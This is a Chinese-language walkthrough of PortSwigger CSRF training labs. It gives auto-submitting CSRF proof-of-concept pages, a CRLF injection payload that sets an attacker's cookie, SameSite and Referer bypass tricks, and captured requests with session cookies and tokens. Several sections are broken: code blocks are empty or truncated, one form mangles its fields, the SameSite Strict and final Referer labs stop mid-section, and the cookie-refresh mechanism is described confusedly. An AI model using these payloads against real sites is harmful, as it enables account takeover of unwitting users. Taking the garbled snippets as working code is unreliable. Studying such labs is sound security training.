# Lab: CSRF vulnerability with no defenses

后端在处理`/my-account/change-email`邮箱修改请求时，仅依赖会话Cookie（`session`）识别当前用户身份，未在请求参数或Header中嵌入任何CSRF Token（令牌），也未校验Referer/Origin头。攻击者可构造恶意页面，诱使已登录的受害者浏览器自动携带会话Cookie发送伪造POST请求，导致受害者的绑定邮箱在不知情中被篡改，进而可能利用“密码重置”功能完全接管账户。

- **攻击向量**：`POST /my-account/change-email`
    
- **利用条件**：受害者必须处于已登录状态（会话Cookie有效）。
    
- **请求参数**：仅包含`email`字段，无任何一次性随机令牌（如`csrf_token`）。
    
- **核心缺陷**：后端对关键操作的身份验证强度不足，仅验证“是谁发起的”（Cookie），未验证“是否是用户自愿发起的”（Token/Referer）。

**利用方式：**  

登录账户后，使用Burp Suite拦截“更改邮箱”的POST请求。右键点击该请求 → 相关工具（Engagement tools）→ 生成CSRF POC（Generate CSRF PoC）。将生成的HTML模板修改为以下代码（需替换靶场ID和目标邮箱）：

```html
<!-- CSRF恶意HTML：自动提交“更改邮箱”请求 -->
<form method="POST" action="https://[你的靶场ID].web-security-academy.net/my-account/change-email">
    <!-- 隐藏字段：指定要修改的目标邮箱（需替换为未占用的邮箱） -->
    <input type="hidden" name="email" value="attacker-new-email@web-security-academy.net">
</form>
<!-- 自动提交脚本：页面加载后立即提交表单，无需用户操作 -->
<script>
    document.forms[0].submit(); // 提交第一个表单（即上方的恶意表单）
</script>
```

**与同类漏洞区别：**  

这是CSRF漏洞中最基础的原始形态（Classic CSRF）。相比需要解析页面提取Token或绕过Referer校验的场景，此实验室的后端完全未做任何防御机制（无Token、无Referer检查、无SameSite Cookie限制），因此攻击者无需编写复杂脚本去爬取或伪造额外参数，仅凭一个最简单的自动提交表单即可完成攻击，利用难度最低。

**测试方法：**  

使用Burp Suite抓取更改邮箱的POST请求，检查请求包中是否缺失`csrf`、`_token`等参数。随后使用Repeater修改或删除`Referer`头并重发请求，若依然返回`200 OK`且邮箱修改成功，则证实后端无任何来源校验。最终使用Burp内置的CSRF POC生成器验证完整的攻击链路，确认可脱离用户交互直接生效。

# Lab: CSRF where token validation depends on request method

后端在`/my-account/change-email`接口中实施了CSRF Token校验，但校验逻辑存在缺陷——**仅对POST请求强制验证`csrf`参数**，当请求方法变为`GET`时，后端完全跳过Token校验。攻击者可将原本的POST请求转换为GET请求，并将参数置于URL查询字符串中，从而绕过Token验证机制，利用CSRF POC诱导受害者执行邮箱更改操作。

- **核心缺陷**：Token验证与请求方法绑定，而非对关键操作统一强制校验。POST时校验`csrf`参数是否与会话匹配，GET时直接放行。
    
- **绕过方式**：`POST /my-account/change-email` → 改为 `GET /my-account/change-email?email=xxx&csrf=任意值`（Token参数即使填写无效值如`111`，后端亦不校验）。
    
- **攻击条件**：受害者需持有有效会话Cookie，且浏览器允许自动提交GET表单（使用`<form method="GET">`或`XMLHttpRequest`）。
    
- **请求格式**：GET方法的参数需拼接到URL中（`?email=xxx&csrf=111`），而非放在请求体。

**利用方式：**  

登录账户后，使用Burp拦截“更改邮箱”的POST请求，将请求方法从`POST`改为`GET`，同时将请求体参数`email=xxx&csrf=xxx`转移到URL查询字符串中（`csrf`参数可随意填写，如`111`），发送后观察邮箱是否成功更改。随后右键点击该GET请求 → 相关工具 → 生成CSRF POC，Burp自动生成如下恶意HTML：

```http
原数据包：
POST /my-account/change-email HTTP/2
Host: 0a8a004704ad882080cb0344005b00bd.web-security-academy.net
Cookie: session=6rAfXmSTXkcz5YM8XPCi9smGyfTx4sCQ
……………………
email=ancd%40qq.com&csrf=gaiKYBt7s1QA5aeUzoi7SxQPgP7usSyz

更改提交方式之后的数据包：
GET /my-account/change-email?email=ancd%40qq.com&csrf=111 HTTP/2
Host: 0a6100e30361b519827dec7400bf0059.web-security-academy.net
Cookie: session=ZEc7KIgUFzWWKChckqXDRisEKc3VhwHw
```

```html
<html>
  <!-- CSRF PoC - 利用GET请求绕过Token校验 -->
  <body>
    <!-- method="GET" 使浏览器将表单参数自动编码到URL中 -->
    <form action="https://[你的靶场ID].web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker-new-email@qq.com" />
      <!-- csrf参数可填写任意占位值，后端不会校验 -->
      <input type="hidden" name="csrf" value="111" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit(); // 自动提交表单
    </script>
  </body>
</html>
```

**与同类漏洞区别：**  

相比无任何防御的CSRF（Lab 1），此场景虽有Token机制但实现不严谨，属于**逻辑绕过型CSRF**。攻击重点在于探测后端对不同HTTP方法的校验差异，而非直接缺失Token。相比需要提取页面Token的CSRF，此场景绕过更简单（仅需修改请求方法）；相比Samesite等高级防御，此漏洞暴露了开发中对RESTful风格的不当理解（误将GET视为“安全只读操作”而未强制校验）。

**测试方法：**

1. 使用Burp Repeater抓取POST更改邮箱请求，将方法改为`GET`，把`email`参数移到URL末尾（如`?email=test@qq.com`），`csrf`参数改为任意值（如`111`），发送请求。若返回`200 OK`且邮箱变更，则确认漏洞存在。
    
2. 观察响应或再次访问账户页面，验证邮箱是否被篡改成功。
    
3. 使用Burp生成CSRF POC，确认自动提交的GET表单能够在无用户交互情况下完成攻击。

# Lab: CSRF where token validation depends on token being present

后端对`/my-account/change-email`接口实施了CSRF Token校验，但校验逻辑存在缺陷——**仅当请求中包含`csrf`参数时才执行验证**，若请求中完全移除该参数，后端则跳过校验直接处理请求。攻击者可通过构造不包含`csrf`字段的恶意POST请求，绕过Token验证机制，利用CSRF POC诱导受害者执行邮箱更改操作。

- **核心缺陷**：后端使用`if isset(csrf) then validate(csrf)`的弱校验逻辑，而非强制要求Token必须存在且有效。
    
- **绕过方式**：在POST请求体中删除`csrf`参数，仅保留`email`字段即可正常处理。
    
- **攻击条件**：受害者需持有有效会话Cookie；表单需使用`method="POST"`（不能转为GET，因为POST方法本身并未被禁用）。
    
- **请求格式**：保持POST方法不变，参数仍放在请求体中，但仅含`email`字段，不携带任何Token信息。

**利用方式：**

登录账户后，使用Burp拦截“更改邮箱”的POST请求，手动删除请求体中的`csrf=xxx`字段，仅保留`email=xxx`，发送后观察邮箱是否成功更改。若成功，右键点击该修改后的POST请求 → 相关工具 → 生成CSRF POC，Burp自动生成如下恶意HTML（注意表单中不包含任何`csrf`隐藏字段）：

```http
数据包中删除csrf字段，只留下email字段
POST /my-account/change-email HTTP/2
Host: 0ad500a504d91ad080f703f9008c00bf.web-security-academy.net
Cookie: session=VRZ7f6uUPBvJ66gbfgz3OTdrWWl2asNH
……………………
email=abcd%401
```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ad500a504d91ad080f703f9008c00bf.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="csrfdeleted&#64;qq.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**与同类漏洞区别：**

相比依赖请求方法的CSRF（Lab 2）需将POST改为GET，此漏洞**保持请求方法为POST**，仅通过删除参数绕过校验。二者虽同属“逻辑校验不严谨”类别，但绕过维度不同：Lab 2的后端校验`method是否为POST`，Lab 3的后端校验`参数是否存在于请求中`。此场景验证了“服务端仅判断参数存在性而忽略空值或缺失状态”的常见编码错误，测试时需特别关注参数缺失与参数为空两种边界情况的差异。

**测试方法：**

1. 使用Burp Repeater抓取POST更改邮箱请求，将请求体中`csrf`参数及其值完全删除，仅保留`email=xxx`，发送请求。若返回`200 OK`且邮箱变更，则确认漏洞存在。
    
2. 可进一步尝试保留`csrf`参数但赋空值（`csrf=`），观察后端是否校验，以区分是“缺失即绕过”还是“空值即放行”。
    
3. 使用Burp生成CSRF POC，删除自动生成的`csrf`隐藏字段（或手动构建无Token的表单），验证自动提交攻击链路是否成功。

# Lab: CSRF where token is not tied to user session

给定两个账户：
- `wiener:peter`
- `carlos:montoya`

wiener用户的csrf为：V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB

carlos用户的csrf为：jR91EVjFM4ENsCBRYaWA5RjwR5OwEoo0

后端在`/my-account/change-email`接口中实施了CSRF Token校验，但校验逻辑存在严重缺陷——**仅验证Token字符串是否有效（格式正确且存在于服务端Session中），但未将该Token与当前发起请求的用户会话进行绑定**。攻击者可登录自己的账户获取合法Token，然后在恶意页面中使用该Token，诱使其他已登录用户（如受害者）提交请求。由于后端只校验Token的有效性而不校验所有者，攻击者持有的Token能够通过受害者的会话验证，导致受害者账户被篡改。

- **核心缺陷**：Token与会话隔离不足——服务端存储了Token对应的用户身份，但校验时仅比对Token是否存在且匹配服务端记录，**未检查Token所属用户与当前请求Cookie中的session用户是否一致**。
    
- **攻击前提**：攻击者需拥有一个合法账户（如`wiener`），并获取其有效的`csrf` Token。
    
- **绕过方式**：在恶意表单中使用攻击者自己账户的`csrf` Token，配合受害者的会话Cookie（由浏览器自动携带），即可成功提交请求。
    
- **关键证据**：同一`csrf` Token（`V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB`）在攻击者`wiener`的会话中可用，在受害者`carlos`的会话中同样有效。

**利用方式：**

1. 使用攻击者账户`wiener:peter`登录靶场，访问“我的账户”页面，通过浏览器开发者工具或Burp抓取页面源码，获取当前会话的`csrf` Token（如`V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB`）。
    
2. 使用Burp拦截`wiener`用户修改邮箱的POST请求，确认请求体中`csrf`参数值为上述Token。
    
3. 右键点击该请求 → 相关工具 → 生成CSRF POC，修改表单中的`email`为目标邮箱，并**保留`csrf`字段为攻击者自己的Token**（无需替换为受害者的Token）。生成的恶意HTML如下：

```
POST /my-account/change-email HTTP/2
Host: 0aa7002504e5650f80790daa00200021.web-security-academy.net
Cookie: session=5RWXsIqY4PrgMOM8eYE8dMSDkMfgJNOE
……………………
email=222%40xn--pssa288fba&csrf=V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB
```

```html
<!--将wiener作为攻击者-->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa7002504e5650f80790daa00200021.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="csrfup" />
      <input type="hidden" name="csrfupdated&#64;qq.com" value="" />
      <input type="hidden" name="csrf" value="V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB" /> <!--在此处使用的是wiener用户的csrf-->
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. 托管该POC并诱使受害者`carlos`（已登录）访问，页面自动提交请求，后端验证`csrf` Token有效（因为`V3zPOE4fQCaiMXkBPo9HDyKCavAVyOoB`确实是系统中合法的Token），但未校验该Token是否属于`carlos`，故邮箱被成功篡改。

**与同类漏洞区别：**  

相比前三个实验室（无防御、方法绕过、参数缺失绕过）均属于“Token校验缺失或逻辑缺陷”，此漏洞属于**Token校验维度不完整**：后端实现了Token机制，但Token的有效范围是全局的（全局共享/用户无关），而非绑定到单一用户。此场景更贴近真实业务中因Session与Token存储分离导致的典型错误——Token校验未关联用户ID。与“Token可预测”或“Token可重用”类别不同，此处的Token本身是随机安全的，问题在于校验逻辑未做归属验证。

**测试方法：**

1. 创建或登录两个独立账户（如`wiener`和`carlos`），分别获取各自的`csrf` Token（可通过页面源码或Burp抓取）。
    
2. 在`wiener`账户的会话中，使用`carlos`的Token发起更改邮箱请求（或将两个Token互换测试），观察是否成功。若任一Token在不同用户会话中生效，则确认漏洞存在。
    
3. 使用Burp Repeater验证：复制`carlos`的完整请求包（含`Cookie`），将`csrf`参数替换为`wiener`的Token，发送请求，若返回`200 OK`且邮箱变更，则证实Token未绑定用户。
    
4. 构建CSRF POC，使用攻击者自己的Token作为固定值，诱使受害者访问，验证完整攻击链路。

# Lab: CSRF where token is tied to non-session cookie

给定两个账户：
- `wiener:peter`
- `carlos:montoya`

wiener用户的csrf为：5jDz2QY5BUfkxYxMPwk7UP2rLfPdea4B，csrfkey为：F7r14D4DF3Jsx7NZmqPIzXE7jsWLTOGQ

carlos用户的csrf为：My1U6W0E04F9Mz99wp6UuJdhR1Ei6gbR，csrfkey为：9bh8dBvnOX3nTMb4F7Gunk3IkWubNMKa

后端在`/my-account/change-email`接口中实施了双重CSRF防御机制：请求体中的`csrf`参数需要与Cookie中的`csrfKey`值进行比对匹配。然而，**`csrfKey` Cookie并未绑定到用户会话，且后端存在CRLF注入漏洞**，允许攻击者通过`/`搜索接口的`search`参数注入`Set-Cookie`响应头，在受害者浏览器中设置攻击者的`csrfKey` Cookie。随后，攻击者使用配套的`csrf`令牌提交表单，由于后端仅校验Cookie中的`csrfKey`与请求体中的`csrf`是否匹配（而不校验Cookie所有者），受害者账户即被篡改。

- **核心缺陷**：Cookie中的`csrfKey`与用户会话未绑定——攻击者可通过CRLF注入强制修改受害者的`csrfKey` Cookie，配合自己的`csrf`令牌通过后端校验。
    
- **攻击依赖**：靶场存在CRLF注入漏洞（`/`搜索接口的`search`参数未过滤`\r\n`），可注入任意响应头。
    
- **双重校验机制**：后端验证逻辑为`请求体中的csrf == Cookie中的csrfKey`，而非`csrfKey是否属于当前会话用户`。
    
- **注入载荷**：`?search=test%0d%0aSet-Cookie:%20csrfKey=[攻击者csrfKey]%3b%20SameSite=None`，利用`%0d%0a`（CRLF）注入`Set-Cookie`响应头。

**利用方式：**  

以`carlos`（攻击者）为目标，攻击流程分两步：

1. **注入攻击者的`csrfKey`到受害者浏览器**  
    搜索功能没有 CSRF 保护，使用`img`标签加载带有CRLF注入的搜索URL，触发响应中的`Set-Cookie`，将受害者的`csrfKey` Cookie覆盖为攻击者的值：详细见payload中注入攻击者的csrfkey处
    注入的`csrfKey`为`carlos`的`9bh8dBvnOX3nTMb4F7Gunk3IkWubNMKa`，`SameSite=None`确保跨站请求时Cookie可被携带。
    
2. **提交包含攻击者`csrf`令牌的更改邮箱表单**  
    表单使用与上一步`csrfKey`配套的`csrf`令牌（攻击者自己的`My1U6W0E04F9Mz99wp6UuJdhR1Ei6gbR`），提交后后端校验通过，邮箱被篡改：详细见payload中表单处
    `img`标签的`onerror`事件触发表单自动提交，确保两个步骤顺序执行。

```http
wiener修改邮箱时的数据包：
POST /my-account/change-email HTTP/2
Host: 0afb00ec037432d88030c6fc006300ef.web-security-academy.net
Cookie: csrfKey=F7r14D4DF3Jsx7NZmqPIzXE7jsWLTOGQ; session=ATRTVIAiVxg0ibYbETFthYJFzTmGhEA2;
………………
email=111%40111&csrf=5jDz2QY5BUfkxYxMPwk7UP2rLfPdea4B

将csrfKey和csrf修改为carlos的发现可以正常执行修改操作
```

```html
<!--将carlos作为攻击者-->
<!-- 1. 注入攻击者的csrfKey -->
<img src="https://0afb00ec037432d88030c6fc006300ef.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=9bh8dBvnOX3nTMb4F7Gunk3IkWubNMKa%3b%20SameSite=None" onerror="document.forms[0].submit()"> <!-- 攻击者的csrfkey -->
<!-- 2. 提交含攻击者令牌的表单 -->
<form method="POST" action="https://0afb00ec037432d88030c6fc006300ef.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="heihei@qq.com">
    <input type="hidden" name="csrf" value="My1U6W0E04F9Mz99wp6UuJdhR1Ei6gbR"> <!-- 攻击者的csrf令牌 -->
</form>
```

**与同类漏洞区别：**  

相比Token未绑定用户会话的CSRF（Lab 4），此漏洞**增加了Cookie层面的校验**，但防御强度仍不足。Lab 4中Token校验完全不验证用户归属，而Lab 5中引入了`csrfKey` Cookie作为校验因子，但因该Cookie与Session解绑，攻击者可通过CRLF注入覆盖此Cookie，使得防御形同虚设。此漏洞展示了“双因子校验”在实现不当（其中一因子可控）时的脆弱性，攻击链更长，涉及CRLF注入与CSRF的组合利用。

# Lab: CSRF where token is duplicated in cookie

后端在`/my-account/change-email`接口中实施了CSRF Token校验，但校验逻辑存在严重缺陷——**仅验证请求体中的`csrf`参数与Cookie中的`csrf`值是否相等**，而未验证Cookie中`csrf`值的合法性或与用户会话的绑定关系。同时，靶场搜索接口`/`存在CRLF注入漏洞，攻击者可通过搜索参数的`%0d%0a`注入`Set-Cookie`响应头，覆盖受害者浏览器中的`csrf` Cookie。攻击者可先通过CRLF注入将受害者`csrf` Cookie设置为攻击者指定的任意值（如`wakaka`），然后提交包含相同`csrf`值（`wakaka`）的更改邮箱表单，后端校验通过，受害者邮箱即被篡改。

- **核心缺陷**：双重校验机制完全失效——`Cookie中的csrf值`与`请求体中的csrf值`进行比对，但**两者均可由攻击者控制**（Cookie通过CRLF注入覆盖，请求体通过表单提交），且后端未校验Cookie中`csrf`值是否与当前Session用户绑定。
    
- **约束条件**：请求必须同时包含Cookie中的`csrf`和请求体中的`csrf`参数，两者缺一不可（删除任意部分均会导致校验失败）。
    
- **CRLF注入点**：搜索接口`/?search=xxx`，`search`参数未过滤`\r\n`，可注入`Set-Cookie`响应头。
    
- **校验逻辑**：`request.body.csrf == request.cookie.csrf`，仅比对字符串值，不涉及用户身份验证。

**利用方式：** 

攻击流程分为两步，通过`img`标签的`onerror`事件串联执行：

1. **CRLF注入覆盖受害者`csrf` Cookie**  
    使用`img`标签加载带有CRLF注入的搜索URL，响应中注入`Set-Cookie`，将受害者Cookie中的`csrf`设置为攻击者指定的值（如`wakaka`）
    注入的`csrf`值为`wakaka`，`SameSite=None`确保跨站请求可携带Cookie。
    
2. **提交包含相同`csrf`值的更改邮箱表单**  
    表单的`csrf`隐藏字段设置为与上一步注入的Cookie值完全相同的值（`wakaka`），后端校验通过，邮箱被篡改：
    `img`的`onerror`事件触发时，表单自动提交；需确保`img`标签加载失败（使用无效src或触发404）以触发`onerror`。

```http
………………
```

**测试方法：**

# Lab: SameSite Lax bypass via method override

后端在`/my-account/change-email`接口中未实施CSRF Token校验，但依赖Cookie的`SameSite=Lax`属性防御CSRF攻击——该策略限制跨站请求仅允许顶级导航（top-level navigation）的GET请求携带Cookie，而POST等非安全方法不会携带。然而，后端支持通过`_method`参数（或`X-HTTP-Method-Override`头）重写请求方法以兼容旧客户端，攻击者可构造一个**顶级导航的GET请求**，在URL中包含`_method=POST`参数，使浏览器携带Session Cookie发起请求，而后端将请求视为POST处理，从而完全绕过SameSite Lax保护。

- **防御机制**：Session Cookie设置了`SameSite=Lax`属性，跨站POST请求不携带Cookie。
    
- **绕过方式**：利用`_method`参数将GET请求重写为POST，浏览器在顶级导航（通过`document.location`或`<a>`链接）中发出GET请求，Cookie正常携带，后端按POST语义处理邮箱变更。
    
- **必要条件**：后端支持方法重写（`_method=POST`或`X-HTTP-Method-Override: POST`），且该方法重写机制适用于`/my-account/change-email`接口。
    
- **请求格式**：`GET /my-account/change-email?email=xxx&_method=POST`，所有参数置于URL查询字符串中。

**利用方式：** 

通过`document.location`强制浏览器进行顶级页面跳转，向目标URL发起GET请求（携带`SameSite=Lax` Cookie），同时通过`_method=POST`参数指示后端将请求视为POST处理：

```http

Host: 0a87004104704546807d0d6d0012007a.web-security-academy.net
Cookie: session=a3gqVk2poQvJ1aQG4VZ1G2eJB2Aa4M9u
………………
email=11%4011
GET请求：
GET /my-account/change-email?email=11%4011 HTTP/2
Host: 0a87004104704546807d0d6d0012007a.web-security-academy.net
Cookie: session=a3gqVk2poQvJ1aQG4VZ1G2eJB2Aa4M9u
通过`_method`重写方法
GET /my-account/change-email?email=11%4011&_method=POST HTTP/2
Host: 0a87004104704546807d0d6d0012007a.web-security-academy.net
Cookie: session=a3gqVk2poQvJ1aQG4VZ1G2eJB2Aa4M9u
```

```js
</script>
```

或使用`<a>`标签诱使受害者点击：


受害者访问该页面或点击链接后，浏览器跳转到目标URL，GET请求携带当前会话Cookie，后端将`_method=POST`解析为POST方法，邮箱即被篡改。

**与同类漏洞区别：**  

相比传统CSRF漏洞依赖Token缺失（Lab 1-3）或Token校验不严（Lab 4-6），此实验室的核心场景是**绕过SameSite Cookie防御机制**。前几个实验未涉及SameSite属性（或未利用），而本实验中Cookie明确设置了`SameSite=Lax`，但开发人员因兼容性需求引入了`_method`重写机制，导致Lax防御被直接架空。该漏洞展示了“安全策略叠加方法重写”时引入的新攻击面——凡是支持方法重写的接口，若未对重写来源做额外校验，都可能被攻击者利用GET请求绕过SameSite限制。此攻击属于“同站策略绕过”而非“Token校验绕过”。

**测试方法：**

1. 拦截更改邮箱的原始POST请求，确认请求中无任何CSRF Token参数。尝试从跨站页面提交该POST请求（使用`<form method="POST">`），观察是否因SameSite限制导致Cookie未携带而请求失败。
    
2. 将请求方法改为GET并重放，观察服务器是否返回`"Method Not Allowed"`，确认后端不接受原生GET请求。
    
3. 在GET请求的URL中添加`_method=POST`参数（如`?email=xxx&_method=POST`），重放请求，观察是否成功修改邮箱。若成功，则确认方法重写机制可利用。
    
4. 在Burp中生成CSRF POC（使用`document.location`方式），模拟受害者点击链接后的顶级导航请求，验证完整攻击链路是否成功执行。

# Lab: SameSite Strict bypass via client-side redirect

后端在`/my-account/change-email`接口中未实施任何CSRF Token校验，完全依赖`SameSite=Strict`的Session Cookie防御跨站请求。然而，网站评论功能存在一个**客户端重定向组件（gadget）**：提交评论后，页面会跳转到`/post/comment/confirmation?postId=x`，由前端JavaScript文件`commentConfirmationRedirect.js`根据`postId`参数动态构造重定向目标URL。攻击者可利用该重定向组件，将`postId`参数指向敏感接口（如更改邮箱），通过**跨站请求触发靶场自身的客户端重定向**，使后续请求被浏览器判定为“同站请求”，从而携带`SameSite=Strict` Cookie完成CSRF攻击。

- **防御机制**：Session Cookie设置了`SameSite=Strict`，完全阻止跨站请求携带Cookie。
    
- **客户端重定向 gadget**：评论确认页`/post/comment/confirmation`加载的JavaScript会根据`postId`参数动态拼接重定向URL。
    
- **路径遍历**：`postId`参数未做过滤，可通过`../`进行路径遍历，将重定向目标指向任意端点。
    
- **请求方法**：更改邮箱接口支持GET请求，且需携带`submit=1`参数。
    
- **核心机制**：客户端重定向（由`window.location`触发）会被浏览器视为**同站请求**，与服务器端重定向（`302`）不同，会携带`SameSite=Strict` Cookie

# Lab: SameSite Lax bypass via cookie refresh

按照生成的CSRF POC无法进行更改邮箱的操作，会自动启动完整的 OAuth 流程登录账号

后端在`/my-account/change-email`接口中未实施CSRF Token校验，依赖Session Cookie的`SameSite=Lax`属性进行防御——跨站POST请求不会携带该Cookie。然而，站点存在**OAuth社交登录功能**（`/social-login`端点），访问该端点会触发完整的OAuth流程并在成功后刷新当前会话（Cookie保持不变，但SameSite状态可能被重新设置或更新）。攻击者可先强制受害者浏览器访问`/social-login`，刷新会话使浏览器重新认可当前站点的跨站请求能力（实际机制涉及OAuth回调带来的同站导航），随后提交CSRF请求，从而绕过`SameSite=Lax`保护。

- **防御机制**：Session Cookie设置了`SameSite=Lax`，跨站POST请求不携带Cookie。
    
- **会话刷新gadget**：`/social-login`端点启动OAuth流程后自动重定向回本站，期间产生同站导航，Cookie的SameSite状态被"刷新"。
    
- **利用前提**：受害者在OAuth服务端（如社交登录提供商）仍保持登录会话，使OAuth流程无需交互即可自动完成。
    
- **攻击时序**：先触发会话刷新（同站导航重置SameSite上下文），再提交CSRF表单。
    
- **方法限制**：`window.open()`默认会被浏览器拦截（需要用户交互触发），因此需使用`onclick`事件绑定用户点击。

**利用方式：**

```html
      <input type="hidden" name="email" value="waka&#64;qq.com" />
    </form>
    Click anywhere on the page
  </body>
  <script>
	window.open('https://0ad000e80360eec380ed21ee00980059.web-security-academy.net/social-login');

	function changeEmail() {
		document.forms[0].submit();
	}

</html>
```

> **注意**：该攻击需要受害者配合进行一次点击操作（相比纯自动化CSRF交互成本稍高），但通过合理的UI/UX设计（如"点击验证"、"领取优惠"等诱饵）可诱导用户点击。

**与同类漏洞区别：** 

相比利用`_method`绕过SameSite Lax（Lab 7），本实验**未引入方法重写机制**，而是利用OAuth登录流程作为"会话刷新gadget"来重置SameSite上下文。与客户端重定向绕过SameSite Strict（Lab 8）相比，本实验绕过的目标是Lax而非Strict，攻击链中同时包含跨站初始请求（访问恶意页面）和同站后续请求（OAuth回调+表单提交），属于"策略降级+交互诱导"的组合型攻击。该漏洞揭示了OAuth等第三方认证流程可能引入意外的会话状态变更，成为绕过SameSite策略的潜在gadget。

**测试方法：**

1. 登录账户，观察登录响应头中Session Cookie是否设置了`SameSite=Lax`。确认更改邮箱接口无任何CSRF Token参数。
    
2. 在Burp中生成基础CSRF POC并托管至exploit server，访问测试，确认邮箱未被更改（因跨站POST请求无法携带Cookie）。
    
3. 访问`/social-login`端点，观察是否自动启动OAuth流程并最终重定向回站点首页或账户页（需确保在OAuth服务端已登录）。
    
4. 构造包含两步攻击的POC：先使用`window.open('/social-login')`，等待几秒后提交表单。解决弹窗拦截问题（使用`onclick`事件触发）。
    
5. 托管最终POC，验证攻击链路是否成功执行（可添加`console.log`或alert辅助调试，观察`/social-login`是否成功加载、表单是否成功提交）。

# Lab: CSRF where Referer validation depends on header being present

后端在`/my-account/change-email`接口中实施了基于Referer头的CSRF防御，但校验逻辑存在严重缺陷——**仅当请求中包含Referer头时才执行验证**，若请求中完全移除Referer头，后端则直接放行。攻击者可通过在恶意页面中添加`<meta name="referrer" content="no-referrer">`标签，使浏览器在发起跨站请求时不发送Referer头，从而绕过Referer校验机制，成功执行CSRF攻击。

- **核心缺陷**：Referer校验逻辑为`if isset(Referer) then validate(Referer)`，而非强制要求Referer必须存在且匹配合法来源。
    
- **绕过方式**：通过`<meta name="referrer" content="no-referrer">`抑制浏览器发送Referer头，或使用`Referrer-Policy: no-referrer`响应头。
    
- **攻击条件**：受害者需持有有效会话Cookie；浏览器需支持`<meta>`标签的referrer策略（主流浏览器均支持）。
    
- **请求格式**：保持POST方法不变，参数仍放在请求体中，与原始请求一致。

**利用方式：**  

登录账户后，使用Burp拦截“更改邮箱”的POST请求，手动删除请求头中的`Referer`字段，发送后观察邮箱是否成功更改。若成功，在Burp生成的CSRF POC中添加`<meta name="referrer" content="no-referrer">`标签，使浏览器在提交表单时不携带Referer头：

```http
原始数据包：
POST /my-account/change-email HTTP/2
Host: 0aa600660444ca4180b303c3006a0029.web-security-academy.net
Cookie: session=JIEtPPOR6T53EgAr85P78T2L8ZtodBXj
………………
Referer: https://0aa600660444ca4180b303c3006a0029.web-security-academy.net/my-account?id=wiener
………………
email=11%4022

删掉referer部分数据包：
POST /my-account/change-email HTTP/2
Host: 0aa600660444ca4180b303c3006a0029.web-security-academy.net
Cookie: session=JIEtPPOR6T53EgAr85P78T2L8ZtodBXj
………………
email=11%4022
```

在生成的POC中加上`<meta name="referrer" content="no-referrer">`标签抑制 Referer 标头

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <meta name="referrer" content="no-referrer">
    <form action="https://0aa600660444ca4180b303c3006a0029.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wakaka&#64;qq.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

托管该POC并诱使受害者访问，浏览器在提交表单时不会发送Referer头，后端因缺少Referer而跳过校验，邮箱即被篡改。

**与同类漏洞区别：**  

相比依赖Token校验的CSRF（Lab 1-6），此漏洞的防御机制基于**Referer头**而非Token。与依赖参数存在性的CSRF（Lab 3）在逻辑上高度相似——两者均为“条件验证”缺陷：Lab 3中“Token存在时才校验，缺失则放行”；本实验中“Referer存在时才校验，缺失则放行”。区别在于校验因子的不同（Token vs Referer）和绕过手段的不同（删除参数 vs 抑制请求头）。此漏洞展示了基于Referer的防御在实现不当时同样脆弱，且`<meta>`标签提供了一种简洁优雅的绕过方式。

**测试方法：**

1. 使用Burp Repeater抓取更改邮箱的POST请求，观察请求头中是否包含`Referer`字段。删除该字段后发送请求，若返回`200 OK`且邮箱变更，则确认漏洞存在。
    
2. 进一步尝试修改Referer为任意值（如`Referer: https://evil.com`），观察后端是否严格校验，以区分是“缺失即绕过”还是“校验值但未做严格匹配”。
    
3. 在Burp生成的CSRF POC中，于`<head>`或`<body>`内添加`<meta name="referrer" content="no-referrer">`标签，托管并验证自动提交攻击是否成功。
    
4. 也可使用`Referrer-Policy: no-referrer`响应头替代meta标签，但meta标签方式更便捷，无需额外服务器配置。

# Lab: CSRF with broken Referer validation

后端在`/my-account/change-email`接口中实施了基于Referer头的CSRF防御，但校验逻辑存在缺陷——**仅验证Referer头中是否包含目标域名字符串**，而非严格校验Referer是否来自合法的同源页面。攻击者可通过`history.pushState()`修改当前页面的URL，在URL查询字符串中嵌入目标站点地址，使浏览器生成的Referer头中包含目标域名（尽管Referer本身来自攻击者控制的页面），从而绕过Referer校验机制。

- **核心缺陷**：Referer验证逻辑为`if Referer.contains("target-domain") then pass`，而非`if Referer matches "^https://target-domain/" then pass`，导致攻击者可在Referer中“注入”目标域名。
    
- **绕过手段**：使用`history.pushState()`将当前页面URL改为`/?https://靶场域名`，使浏览器在发起POST请求时，Referer头变为`https://攻击者页面/?https://靶场域名`，包含目标域名字符串。
    
- **额外配置**：需设置`Referrer-Policy: unsafe-url`，使浏览器在Referer中保留完整的URL（含查询字符串），否则浏览器默认会截断查询字符串。
    
- **攻击条件**：受害者需持有有效会话Cookie；浏览器需支持`history.pushState()`和`Referrer-Policy`（主流浏览器均支持）。

如果更改数据包中的referer：

```
Referer: https://0a25001403cd058d80fec118000800de.web-security-academy.testtest/my-account?id=wiener
```

响应：`Invalid referer header`

再次尝试修改为：

```
Referer: https://test.com?https://0a25001403cd058d80fec118000800de.web-security-academy.net/my-account?id=wiener
```

此时可以正常进行流程

**利用方式：**  

在Burp生成的CSRF POC基础上进行修改：

